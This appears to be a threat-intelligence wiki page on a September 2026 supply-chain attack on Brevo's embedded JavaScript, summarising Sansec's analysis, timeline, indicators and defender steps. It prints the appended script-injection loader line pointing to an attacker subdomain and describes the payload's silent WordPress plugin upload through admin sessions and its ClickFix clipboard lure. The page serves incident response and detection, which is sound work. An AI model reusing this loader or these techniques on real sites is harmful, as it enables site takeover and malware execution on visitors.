# Brevo supply-chain attack: poisoned tracker/chat-widget JavaScript hits 100k+ customer sites with silent WordPress-plugin installs and a ClickFix overlay (Sansec Forensics, Sep 16, 2026)

## Tags
- ops
- supply-chain attack
- web supply chain
- third-party JavaScript
- Brevo
- Sendinblue
- Cloudflare account compromise
- DNS records
- ClickFix
- WordPress plugin backdoor
- marketing automation
- chat widget
- customer messaging
- amplification
- CSP monitoring
- Sansec
- malware injection
- clipboard command
- e-commerce
- incident response

## Summary

On **September 16, 2026**, the **Sansec Forensics Team** published a forensic analysis showing that a breach of marketing/messaging provider **Brevo** (formerly Sendinblue — clients publicly include eBay, Louis Vuitton, Michelin, Amnesty International) was **much larger than disclosed**: on **September 14, 2026, between 16:05:18 and 20:12:53 UTC**, Brevo itself served poisoned JavaScript from its own domains and its two customer-embedded CDN assets, reaching **more than 100,000 customer websites and every recipient who clicked a link in a Brevo-sent campaign email** (unsubscribe/form pages were also injected). The malware had two delivery paths:

1. **WordPress administrators** logged into `wp-admin` who visited their own site's front end had a **malicious plugin silently installed from `cdn10.sendibt1[.]com/p/wm.zip` through their own live session** (POST to `/wp-admin/update.php?action=upload-plugin`). Sansec could not recover the plugin and therefore cannot verify its functionality, but assesses it as a likely persistent backdoor.
2. **Everyone else** — any visitor of an embedding site, or any campaign recipient landing on a Brevo-hosted unsubscribe/form page — got a full-screen **ClickFix overlay** ("prove you are human") that places a malicious command on the clipboard and instructs the visitor to paste and run it.

The injected loader was confirmed on `www.brevo.com`, `meet.brevo.com` booking pages, the `conversations-widget.brevo.com` iframe page, `sibforms.com` hosted signup/unsubscribe pages, and in the two scripts merchants embed themselves: `https://cdn.brevo[.]com/js/sdk-loader.js` and `https://cdn.brevo[.]com/js/brevo-conversations.js` — each got one appended line loading `f.js` from rotating attacker-created subdomains of **`sendibt1[.]com`, a legitimate Brevo-owned domain**. Because a TLS certificate for `cdn.sendibt1[.]com` was created **August 25, 2026** (Certificate Transparency) and the apex was never proxied while only the malicious `cdn*` records were, the attacker held **write access to Brevo's DNS**. Sansec's root-cause hypothesis — **a compromised Cloudflare account** covering Brevo's five apex domains, explaining both the DNS writes and the dynamic response rewrites (`Last-Modified` unchanged before/during/after) — is explicitly labeled a hypothesis; Brevo had not confirmed the root cause at publication, though per Sansec and CyberInsider, **Brevo's own status-portal announcement largely confirms the incident itself**.

Every malicious host **stopped resolving on September 15** and the origin files are clean. No actor attribution is public. This is the third major 2026 compromise of a centrally served third-party web script (after Adform Trackpoint and the OptinMonster-style pattern) — and the first observed here to combine silent authenticated-plugin-install (targeting the site) with ClickFix (targeting the visitor) from a single injected line.

## Why this matters

- **One injected line, 100k+ sites.** Customer sites that embed the Brevo tracker or chat widget served malware without their operators touching anything — the classic shared-script amplification that makes marketing/messaging SaaS a holy-grail supply-chain target.
- **Two victim classes from one payload.** Site owners (via their own admin session — no exploit needed, the session does the install) and site visitors/customers (via ClickFix self-execution). A compromise of your messaging vendor puts both your site and your audience in scope.
- **Email-to-web bridging.** Clicking an "unsubscribe" link in a legitimate marketing email landed recipients on an injected Brevo-hosted page — the trust of the email carried into a malicious web experience.
- **DNS/CDN control-plane compromise, not a code deploy.** The `Last-Modified` dates on the poisoned assets never changed, only the attacker's `cdn*` records were proxied, and the malware subdomains resolved behind Cloudflare while the apex pointed at Brevo's own `172.246.243.65` (AS200484, `server: envoy`). Attackers increasingly go for the account that controls DNS and edge transforms rather than the application.
- **The legitimate domain trap.** `sendibt1[.]com` is Brevo's own email-tracking domain. Maltrail listed the **apex** alongside the malicious subdomains on Sep 15 and removed it on Sep 16 — blocking the apex breaks open/click statistics for every Brevo customer. Block the `cdn*.sendibt1[.]com` records, never the apex.

## Technical behavior

**Injection.** A verified-copy comparison shows the two customer-embedded scripts gained one appended IIFE (hostname varied per capture):

```js
;(function(){var s=document.createElement("script");s.src="https://cdn2.sendibt1[.]com/f.js";s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
```

Malicious loader hosts (all NXDOMAIN since Sep 15): `cdn`, `cdn2`, `cdn3`, `cdn4`, `cdn9`, `cdn10`, `cdn11` `.sendibt1[.]com`. `cdn.sendibt1[.]com` created 2026-08-25 17:08 UTC per CT logs (IP `104.21.77.104`); `cdn9` first observed 2026-09-14 (IP `188.114.97.3`).

**`f.js` logic (Sansec's deobfuscated copy is published):**
- **Visitor logged into WordPress?** → silently POST the plugin archive `cdn10.sendibt1[.]com/p/wm.zip` to `/wp-admin/update.php?action=upload-plugin` using the admin's own cookies. Plugin unrecovered; suspected persistent PHP backdoor.
- **Otherwise** → render a full-screen ClickFix "verify you are human" overlay: a command is pre-loaded on the clipboard (fetched from `/api/v1/4aff112?tk=`) and the visitor is instructed to open a terminal and paste/run it.
- **Anti-analysis gates:** does not activate for crawlers, developers, or automated scanners.
- **Telemetry endpoints** (relative to the malware host): fingerprint POSTs `/api/v1/0044d4a` and `/api/v1/8e4c615`; proof-of-work tokens `/api/v1/e08a3c4` and `/api/v1/f659473`; clipboard command `/api/v1/4aff112?tk=`; event beacons `/api/v1/b832c14?e=` (click, copy, fallback, failure, close); image beacons `/api/v1/4ead0ff?tk=` and `/image.php?tk=`.
- **Kit self-location fingerprints:** `script[src*="file.js"]` (kit default) and `script[data-c]` (the injection sets the attribute).
- **Cloaking:** identical scanner/crawler response across every host and every observed scan: SHA-256 `4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7`, body `{"s":0,"r":"https://www.google.com"}`.

**CSP telemetry.** Sansec's CSP monitor recorded **2,549 violation reports across 12 monitored sites** during and after the window; the last CSP report from a cached copy arrived Sep 15 17:45 UTC — about **21 hours after the origin stopped serving malware** (cache persistence is real; see Adform).

## Timeline (Sansec, CT logs, Brevo's own write-up)
- **2026-08-25 17:08 UTC** — certificate for `cdn.sendibt1[.]com` created (attacker had DNS write access at least ~3 weeks before the payload).
- **2026-09-10 06:30 / 08:30 UTC** — separate, earlier Brevo incident: attacker exploited **improperly scoped SAML SSO** access reaching **138 customer accounts** (contacts exported from 43, phishing sent from 6); access path closed 08:30, sessions reset, disclosed Sep 10. Whether the two incidents share an actor or entry path is not established.
- **2026-09-14 16:04:23 UTC** — last clean `sdk-loader.js` observed.
- **2026-09-14 16:05:18 UTC** — first malicious `sdk-loader.js` observed.
- **2026-09-14 20:12:53 UTC** — last malware activity from a Brevo domain.
- **2026-09-15** — every malicious host stops resolving; origin files restored. Maltrail adds `cdn9/cdn10/cdn11` **and the apex** (11:41) and removes the apex on Sep 16 20:19.
- **2026-09-16** — Sansec publishes; Brevo posts a status-portal announcement largely confirming the incident.
- **2026-09-17** — wide secondary coverage (BleepingComputer, Cybernews, CyberInsider) — "100,000+ websites serve malware for hours."

## Defender actions

### WordPress sites (especially those embedding Brevo tracker/chat/hosted forms)
1. Search access logs for **POST `/wp-admin/update.php?action=upload-plugin`** on 2026-09-14 (16:05–20:13 UTC) and a following **GET `/wp-admin/plugins.php?action=activate`**.
2. Check any plugin with install/activation date **Sep 14, 2026**; **compare the plugin directory on disk against what the admin screen lists** — a plugin can hide itself from the list.
3. Treat filesystem-vs-admin-screen drift as compromise, not a glitch; hunt before reimaging decisions.

### Visitors / campaign recipients
4. Anyone who saw a full-page "verify you are human" prompt and pasted+ran the command **executed attacker code** — run a full AV scan urgently; assume credential and session theft exposure.

### Everyone embedding third-party scripts
5. **Deploy CSP + violation monitoring** — CSP reports are how Sansec measured the blast radius; without them you cannot reconstruct which pages loaded which external script when.
6. Inventory externally hosted JavaScript; alert on **response-hash/size/behavior drift** in high-reach scripts (new appended script-injection IIFE, new raw-IP or new-subdomain destinations, clipboard access, DOM-wide mutation).
7. Understand your vendors' **DNS and CDN account topology**: who can create subdomains, who can write edge transforms/Workers. Account-level compromise at a vendor = silent rewrites across every zone in the account with unchanged file metadata.
8. When blocklisting vendor-owned infrastructure, **block only the specific malicious records** (`cdn*.sendibt1[.]com`), not legitimate tracking apexes (`sendibt1[.]com`) — apex blocklisting breaks business functions and was already retracted by one major detection feed.

## Public indicators
- Poisoned assets with clean/injected SHA-256 pairs (origin clean since Sep 15):
  - `https://cdn.brevo[.]com/js/sdk-loader.js` — clean `fe8447fd1ec4dca652b71db2c749fcc24a5bec3875f3654042169fb2418aed09` (3442 B); injected→cdn2 `58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308`; injected→cdn11 `f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782`
  - `https://conversations-widget.brevo[.]com/brevo-conversations.js` — clean `26166cd87ff07e7a50317a24126d14b262e842c5715585636dee3ab3f227ddca` (72816 B); injected→cdn4 `9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5`
- Malware hosts (NXDOMAIN since 2026-09-15): `cdn.sendibt1[.]com` (`104.21.77.104`, cert 2026-08-25), `cdn2.`, `cdn3.`, `cdn4.`, `cdn9.` (`188.114.97.3`), `cdn10.`, `cdn11.sendibt1[.]com`
- Payload paths: `/f.js`, `/p/wm.zip`, `/api/v1/0044d4a`, `/api/v1/e08a3c4`, `/api/v1/8e4c615`, `/api/v1/f659473`, `/api/v1/4aff112?tk=`, `/api/v1/b832c14?e=`, `/api/v1/4ead0ff?tk=`, `/image.php?tk=`
- Cloak response body SHA-256: `4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7`
- Kit selectors: `script[src*="file.js"]`, `script[data-c]`

**Do not block the apex `sendibt1[.]com`** — legitimate Brevo email-tracking infrastructure (Maltrail listed then retracted it). Legitimate Brevo hosts `172.246.243.65` / AS200484 / `server: envoy` are vendor infrastructure, not malicious indicators.

## Evidence limits
- **Root cause unconfirmed.** The Cloudflare-account-compromise explanation is Sansec's hypothesis; Brevo has not publicly confirmed how the attacker obtained DNS writes and cross-domain response rewrites.
- **The WordPress plugin was never recovered** — its functionality, persistence, and any C2 beyond `p/wm.zip` are unverified; "likely backdoor" is an assessment, not a finding.
- **Victim counts are exposure estimates, not confirmations**: "100,000+ sites" counts sites embedding the affected assets during the window; no public count of successful plugin installs or ClickFix executions exists.
- **No actor attribution** and no established link between the Sep 10 SAML-SSO account takeover (138 accounts) and the Sep 14 script injection, despite the proximity.
- Whether the ClickFix delivered a single fixed command or per-victim commands (the `?tk=` token and proof-of-work endpoints suggest per-session issuance) is not resolved publicly.

## Related pages
- [Adform Trackpoint JavaScript supply-chain crypto clipper](adform-trackpoint-javascript-supply-chain-crypto-clipper.md) — same shared-script amplification class, page-context payload
- [Packagist themes iOS spyware / crypto-wallet seed theft (Socket / FUNNULL)](packagist-themes-ios-spyware-crypto-wallet-seed-theft-socket-funnull.md) — CMS themes as a shared-JS injection carrier
- [Deep-Live-Cam supply-chain compromise](deep-live-cam-python-dependency-supply-chain-clipboard-hijacker-safedep-september-2026.md) — clipboard-hijacking monetization, maintainer-account compromise
- [RMM phishing campaign — verbatim disposable infrastructure](rmm-phishing-campaign-46-countries-verbatim-disposable-infra-anyrun-september-2026.md) — ClickFix-adjacent disposable-web-infrastructure tradecraft
- [Google Docs Apps Script sidebar ClickFix → rogue root CA](google-docs-apps-script-sidebar-clickfix-rogue-ca-ledger-implant-huntress-september-2026.md) — ClickFix lure with far heavier Windows payload

## Sources
- Sansec Forensics Team: [Brevo supply chain attack hits 100k+ sites with WordPress backdoors and ClickFix malware](https://sansec.io/research/brevo-supply-chain-attack) (Sep 16, 2026)
- BleepingComputer: [Brevo supply-chain attack injected ClickFix scripts on customer sites](https://www.bleepingcomputer.com/news/security/) (Sep 17, 2026)
- Cybernews: [Brevo hack: 100,000+ websites serve malware for hours in a supply chain attack](https://cybernews.com/) (Sep 17, 2026)
- CyberInsider: [100,000+ WordPress sites infected via Brevo supply chain attack](https://cyberinsider.com/100000-wordpress-sites-infected-via-brevo-supply-chain-attack/) (Sep 17, 2026; notes Brevo's status-portal announcement largely confirming Sansec)
- Brevo Status: [status.brevo.com](https://status.brevo.com/) (incident communication)
